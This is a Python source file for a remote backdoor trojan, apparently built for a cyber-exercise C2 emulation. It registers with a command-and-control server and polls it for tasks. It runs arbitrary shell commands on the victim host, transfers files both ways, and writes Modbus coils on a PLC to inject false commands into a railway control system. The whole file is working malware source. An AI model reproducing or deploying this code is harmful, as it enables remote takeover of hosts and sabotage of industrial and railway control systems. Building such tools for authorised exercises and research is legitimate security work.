#-----------------------------------------------------------------------------
# Name:        falsecmdinjector.py
#
# Purpose:     This module is modified from the backdoor trojan program <backdoorTrojan.py>
#              to add the plc-ModBus communication module so the C2 system can 
#              use it to launch the false command injection attack to the XS2023
#              railway system remotely.
#
# Author:      Yuancheng Liu
#
# Version:     v_0.1.1
# Created:     2023/10/19
# Copyright:   Copyright (c) 2023 LiuYuancheng
# License:     MIT License
#-----------------------------------------------------------------------------
""" Program design: 
    We want to implement a remote backdoor trojan which can carry other Malicious
    Action function to build a remote controlable malware which can linked in our 
    C2 emulation system (https://github.com/LiuYuancheng/Python_Malwares_Repo/tree/main/src/c2Emulator)
    This program will be used in the testRun attack demo and verfication of the 
    cyber event : Cross Sward 2023
"""

import os
import time
import subprocess
from datetime import datetime
import ConfigLoader
import modbusTcpCom

import c2MwUtils
import c2Client

CONFIG_FILE_NAME = 'falseCmdInjectorCfg.txt'

print("Current working directory is : %s" % os.getcwd())
dirpath = os.path.dirname(__file__)
print("Current source code location : %s" % dirpath)

gGonfigPath = os.path.join(dirpath, CONFIG_FILE_NAME)
iConfigLoader = ConfigLoader.ConfigLoader(gGonfigPath, mode='r')
if iConfigLoader is None:
    print("Error: The config file %s is not exist.Program exit!" %str(gGonfigPath))
    exit()
CONFIG_DICT = iConfigLoader.getJson()

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class falseCmdInjector(object):

    def __init__(self) -> None:
        self.malwareID = CONFIG_DICT['OWN_ID']
        self.malownIP = CONFIG_DICT['OWN_IP']
        # Init the C2 connector
        c2Ipaddr = CONFIG_DICT['C2_IP']
        c2Port = int(CONFIG_DICT['C2_PORT'])
        self.c2Connector = c2Client.c2Client(self.malwareID, c2Ipaddr, 
                                             c2Port=c2Port, ownIP=self.malownIP)
        self.taskList = [
            {
                'taskID': 0,
                'taskType': 'register',
                'StartT': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'repeat': 1,
                'ExPerT': 0,
                'state' : c2MwUtils.TASK_R_FLG,
                'taskData': None
            }
        ]
        self.ownRcd = c2MwUtils.mwClientRcd(self.malwareID, self.malownIP, taskList=self.taskList)
        self.c2Connector.registerToC2(taskList=self.taskList)
        
        # Init the PLC connector 
        plcIP = CONFIG_DICT['PLC_IP']
        plcPort = int(CONFIG_DICT['PLC_PORT'])
        self.plcConnector = modbusTcpCom.modbusTcpClient(plcIP, tgtPort=plcPort)
        while not self.plcConnector.checkConn():
            print('try connect to the PLC')
            print(self.plcConnector.getCoilsBits(0, 4))
            time.sleep(0.5)
        
        self.c2Connector.start()
        self.terminate = False 

    #-----------------------------------------------------------------------------
    def run(self):
        while not self.terminate:
            # Check whether got new incomming task
            task = self.c2Connector.getOneC2Task()
            # sychronized the task record
            if task is not None:
                self.ownRcd.addNewTask(task)
            # do one task
            for taskDict in self.ownRcd.getTaskList(taskState=c2MwUtils.TASK_A_FLG):
                idx = taskDict['taskID']
                resultStr = 'taskfinished'
                for _ in range(taskDict['repeat']):
                    if taskDict['taskType'] == 'upload' or taskDict['taskType'] == 'download':
                        time.sleep(int(taskDict['ExPerT']))
                        uploadFlg = taskDict['taskType'] == 'upload'
                        self.c2Connector.transferFiles(taskDict['taskData'], uploadFlg=uploadFlg)
                        resultStr = 'File transfered'
                    elif taskDict['taskType'] == c2MwUtils.CMD_FLG:
                        cmd = str(taskDict['taskData'][0])
                        print("Run cmd : %s " %str(cmd))
                        resultStr= self.runCmd('detail', cmd)
                    elif taskDict['taskType'] == 'modbus':
                        data = str(taskDict['taskData']).strip()
                        vals = data.split(';')
                        act = vals[0]
                        itemType = vals[1]
                        addr = int(vals[2])
                        if act == 'read':
                            offset = int(vals[3])
                            if itemType == 'reg':
                                result = self.plcConnector.getHoldingRegs(addr, offset)
                                resultStr = str(result)
                            else:
                                result = self.plcConnector.getCoilsBits(addr, offset)
                                resultStr = str(result)
                        elif act == 'write':
                            coilVal = int(vals[3])
                            result = self.plcConnector.setCoilsBit(addr, coilVal==1)
                            resultStr = str(result)
                    self.ownRcd.setTaskState(idx, state=c2MwUtils.TASK_F_FLG)
                    reportDict ={
                        'taskID': idx,
                        'state': c2Client.TASK_F_FLG,
                        'Time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'taskData': str(resultStr)
                    }
                    self.c2Connector.addNewReport(reportDict)
                    self.ownRcd.setTaskState(idx, state=c2MwUtils.TASK_F_FLG)
                    time.sleep(0.1)
                
    #-----------------------------------------------------------------------------
    def runCmd(self, returnType, cmdStr):
        """ Run a command and collect the result on the victim host.
        Args:
            returnType (str): if == 'detail' return the command execution result, 
                        else return execution success/fail
            cmdStr (str):  command string.
        """
        if returnType and cmdStr:
            try:
                result = subprocess.check_output(str(cmdStr), 
                                                stderr=subprocess.STDOUT, 
                                                shell=True)
                print(result)
                return result if returnType == 'detail' else 'success'
            except Exception as err:
                print("Rum cmd error: %s" %str(err))
                return str(err) if returnType == 'detail' else 'fail'
        else:
            return 'error'
        
    def stop(self):
        self.c2Connector.stop()

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main():
    client = falseCmdInjector()
    time.sleep(1)
    client.run()
    for i in range(10):
        time.sleep(1)
        print(i)
    client.stop()

if __name__ == '__main__':
    main()
